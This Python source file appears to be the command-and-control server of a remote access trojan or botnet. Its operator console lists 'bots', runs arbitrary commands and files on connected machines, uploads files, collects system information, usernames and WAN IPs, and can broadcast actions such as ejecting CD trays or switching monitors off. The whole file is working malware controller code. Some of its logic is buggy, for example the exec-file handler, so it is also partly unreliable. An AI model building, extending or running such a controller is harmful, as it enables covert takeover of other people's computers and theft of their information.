import socket
import _thread
import os, time
import configparser
import requests
from urllib.request import urlopen
from .fetchinfo import *
import colorama


VERSION = "V.0"
BUFFER = 1024
global client, addr
global infofilename
clist = []
iplist = []
global remote_hostname
global cip, cport
global myip, myport

config = configparser.ConfigParser()
try:
    config.read("settings.ini")
except FileNotFoundError:
    print(" Configuration file not found.")
except Exception as e:
    print(str(e))

main = config['DEFAULT']
myip = main['host']
myport = int(main['port'])


    
def Server():

    def threaded_management(sock):
        
        infofilename = "bots/" + cip + ".txt"
        print("[^] Getting system information of " + cip + ".")
        GetINFO(client, infofilename)

        def SendData(data):
            data = data.encode()
            
            try:
                for sockfd in clist:
                    sockfd.sendall(data)
            except Exception as serror:
                print("[ERROR] " + str(serror))
        
        def private(cid, data):
            data = data.encode()
            try:
                csock = clist[cid]
                csock.send(data)
            except Exception as serror:
                print("[ERROR] " + str(serror))

        def private_byte(cid, data): # Send without encoding..
            try:
                csock = clist[cid]
                csock.send(data)
            except Exception as serror:
                print("[ERROR] " + str(serror))
                
        # def SendBytes(data): # Send without encoding..
        #     try:
        #         sock.send(data)
        #     except Exception as serror:
        #         print("[ERROR] " + str(serror))

        def console():
            try:
                data = input("-> ")
                msg = data.encode()
                args = data.split()

                if(data == "info"):
                    try:
                        with open(infofilename, "r+") as info:
                            data = info.read()
                            print(data)
                    except FileNotFoundError:
                        print("[-] Information does not exist.")
                        print("[^] Getting System information..")
                        GetINFO(client, infofilename)
                        print("[+] Got System information.")
                elif(data == "list"):
                    print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "Online : " + colorama.Style.RESET_ALL + str(len(clist)))
                    for i in range(len(iplist)):
                        print("["+str(i)+"]: " + colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX + iplist[i] + colorama.Style.RESET_ALL)
                elif(data.startswith("send")):
                    try:
                        if(len(args[1]) and len(args[2]) > 0):
                            send_socket = int(args[1])
                            private(send_socket, args[2])
                        else:
                            print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : send <id> <command>" + colorama.Style.RESET_ALL)
                    except IndexError:
                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : send <id> <command>" + colorama.Style.RESET_ALL)


                elif(data.startswith("transfer")):
                    try:
                        filename = args[1]
                        rfilename = args[2]
                        client_socket = int(args[3])
                        with open(filename, "r+") as sendfile:
                            private(client_socket, "recvthis="+rfilename)
                            data = sendfile.read()
                            bufferst = os.stat(filename)
                            print("[+] File opened " + filename + " ("+str(bufferst.st_size) + " bytes)" )
                            private(client_socket, data)
                            print("[+] File Sent.")
                    except FileNotFoundError:
                        print("[x] File not found!?")
                    except IndexError:
                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : transfer <filename> <remote filename> <client id>" + colorama.Style.RESET_ALL)
                    except Exception as e:
                        print("[x] Error : " + str(e))
                        
                elif(data.startswith("bsendfile")):
                    try:
                        #print("(TIP : Use exec-file to Execute an Application)")
                        filename = args[1]
                        rfilename = args[2]
                        client_socket = int(args[3])
                        with open(filename, "rb") as sendfile:
                            private(client_socket, "recvthis="+rfilename)
                            data = sendfile.read()
                            bufferst = os.stat(filename)
                            print("[+] File opened " + filename + " ("+str(bufferst.st_size) + " bytes)" )
                            private_byte(client_socket, data)
                            print("[+] Sending File..")
                    except FileNotFoundError:
                        print("[x] File not found!?")
                    except IndexError:
                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : bsendfile <filename> <remote filename> <client id>" + colorama.Style.RESET_ALL)
                    except Exception as e:
                        print("[x] Error : " + str(e))

                elif(data == "exec-file"):
                    try:
                        appname = args[1]
                        SendData("exec="+appname)
                    except IndexError:
                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : exec-file <file on remote pc>" + colorama.Style.RESET_ALL)
                elif(data == "exec"):
                    command = input("[>] Enter Command -> ")
                    SendData("cmd="+command)

                elif(data == "hostname"):
                    SendData("hostname")
                
                elif(data == "username"):
                    SendData("username")

                elif(data.startswith("msgbox")):
                    try:
                        client_socket = int(args[1])
                        msg = input("[>] Enter Message Box Message -> ")
                        title = input("[>] Enter Message Box Title -> ")
                        private(client_socket, "msgbox="+msg+"="+title)
                    except IndexError:
                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
                        if(broadcast == "y"):
                            msg = input("[>] Enter Message Box Message -> ")
                            title = input("[>] Enter Message Box Title -> ")
                            SendData("msgbox="+msg+"="+title)
                        else:
                            print("USAGE : msgbox <id>")

                elif(data == "wanip"):
                    SendData("wanip\n")

                elif(data == "help"):
                    print("""
                    HELP ^_^
                    - list - List all active clients with their ID's.
                    - transfer - send a normal file (non-binary)
                    - bsendfile - send a binary file 
                    - kill - kill the connection
                    - info - View remote pc system information
                    - msgbox - send client a message box
                    - exec - Execute a Command on remote machine.
                    - exec-file - Execute a File on remote machine.
                    - wanip - Get Wan ip of remote machine.
                    - hostname - Get Hostname of Remote machine.
                    - username - Get Username of Remote Machine.
                    - cdopen - Eject CD ROM.
                    - cdclose - Close CD ROM.
                    - monitoron - Turn monitor ON.
                    - monitoroff - Turn monitor Off.
                    - playaudio - Play Audio.
                    - send - Send to specefic client. (EG: send hostname 0)                    
                    """)
                elif(data.startswith("cdopen")):
                    try:
                        client_socket = int(args[1])
                        private(client_socket, "cdopen")
                    except IndexError:
                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
                        if(broadcast == "y"):
                            SendData("cdopen")
                        else:
                            print("USAGE : cdopen <id>")
                elif(data.startswith("cdclose")):
                    try:
                        client_socket = int(args[1])
                        private(client_socket, "cdclose")
                    except IndexError:
                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
                        if(broadcast == "y"):
                            SendData("cdclose")
                        else:
                            print("USAGE : cdclose <id>")
                elif(data.startswith("monitoron")):
                    try:
                        client_socket = int(args[1])
                        private(client_socket, "monitoron")
                    except IndexError:
                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
                        if(broadcast == "y"):
                            SendData("monitoron")
                        else:
                            print("USAGE : monitoron <id>")
                elif(data.startswith("monitoroff")):
                    try:
                        client_socket = int(args[1])
                        private(client_socket, "monitoroff")
                    except IndexError:
                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
                        if(broadcast == "y"):
                            SendData("monitoroff")
                        else:
                            print("USAGE : monitoroff <id>")
                elif(data.startswith("playaudio")):
                    try:
                        client_socket = int(args[1])
                        audio = input("[+] Enter Filename (WAV) -> ")
                        private(client_socket, "playaudio="+audio)
                    except IndexError:
                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
                        if(broadcast == "y"):
                            audio = input("[+] Enter Filename on Remote PC's (WAV) -> ")
                            SendData("playaudio="+audio)
                        else:
                            print("USAGE : playaudio <id>")
                    
                elif(data.startswith("kill")):
                    try:
                        kill_socket = int(args[1])
                        clist[kill_socket].close()
                    except IndexError:
                        print("USAGE : kill <id> or exit to kill all.")
        
                # else:
                #     print("[~] Unknown command.")
            except KeyboardInterrupt:
                print(" Keyboard Interrupt. Exit.")
                exit(True)
            except ValueError:
                exit(True)
            except EOFError:
                exit(True)


        def recv():
            ## Receive the answer of "wanip" and save it.
            try:
                data = sock.recv(BUFFER)
                data = data.decode()
                print("\r\n"+cip + " : " + data)
            except ConnectionAbortedError as e_one:
                print("[ERROR] "+str(e_one) + ". Exit.")
                client.close()
                server.close()
                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ cip + " Disconnected.("+str(e_one)+")")
                time.sleep(1)
                exit(True)
                

            except ConnectionRefusedError as e_two:
                client.close()
                server.close()
                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ cip + " Disconnected. ("+str(e_two)+")")
                time.sleep(1)
                
                

            except ConnectionResetError as e_three:
                print("[ERROR] " + str(e_three) + ". Exit.")
                client.close()
                server.close()
                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ cip + " Disconnected.("+str(e_three)+")")
                time.sleep(1)
                exit(True)
                

            except Exception as e:
                client.close()
                server.close()
                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ cip + " Disconnected.("+str(e)+")")
                time.sleep(1)
                exit(True)
                

        while(True):
            console()
            _thread.start_new_thread(recv, ())
            

    def run_():
        _thread.start_new_thread(threaded_management, (client,))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 5)

    try:
        server.bind((myip, myport))
    except Exception as i:
        raise i

    try:
        server.listen(5)
        print("[+] Waiting for Incoming Connections (" + myip + ":" + str(myport) + ").")
    except KeyboardInterrupt:
        print(" Keyboard Interrupt, Exit.")
        exit()
    except Exception as errunknown:
        print(str(errunknown))
        
    while(True):
        try:
            client, addr = server.accept()
        except KeyboardInterrupt:
            print(" Keyboard Interrupt, Exit.")
            exit()
            # Change name of exception add to todo list
        except Exception as errwhat:
            print(str(errwhat))

        cip =  str(addr[0]) 
        cport = str(addr[1])
        print("[+] Connection from "+ cip+":"+cport + " ( " + myip + ":" + str(myport) + " --> " + cip+":"+cport + " )")
       
        
        print("[+] HOST " + cip + " has connected.")
        clist.append(client)
        iplist.append(addr[0])
        try:
            run_()
        except KeyboardInterrupt:
            print(" Keyboard Interrupt. Exit.")
            exit(True)
        except Exception as ie:
            print("[ERROR] " + str(ie) + ". Type list-all to view Clients.")
            pass
